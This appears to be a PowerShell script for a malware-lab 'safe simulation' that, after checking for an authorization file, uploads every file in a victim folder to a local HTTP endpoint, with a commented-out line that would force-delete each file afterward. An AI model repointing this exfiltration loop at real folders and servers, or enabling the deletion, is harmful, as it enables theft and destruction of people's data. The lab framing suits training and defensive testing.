# Configuration
$VictimFolder = "C:\MalwareLab\VictimFiles"
$ServerUploadURL = "http://localhost:5000/upload"

Write-Host "Starting SAFE simulation..."

# Check authorization file
if (!(Test-Path "$VictimFolder\ALLOW_SIMULATION.txt")) {
    Write-Host "Simulation NOT authorized. Stopping."
    exit
}

# Scan for files
$files = Get-ChildItem $VictimFolder -File

foreach ($f in $files) {
    try {
        Write-Host "Uploading $($f.Name)..."

        $form = @{
            file = Get-Item $f.FullName
        }

        Invoke-WebRequest `
            -Uri $ServerUploadURL `
            -Method Post `
            -InFile $f.FullName `
            -ContentType "multipart/form-data" `
            -Form $form | Out-Null

        Write-Host "Uploaded: $($f.Name)"

        # OPTIONAL: delete after upload
        # Remove-Item $f.FullName -Force

    } catch {
        Write-Host "Error uploading $($f.Name)"
    }
}

Write-Host "Simulation complete."
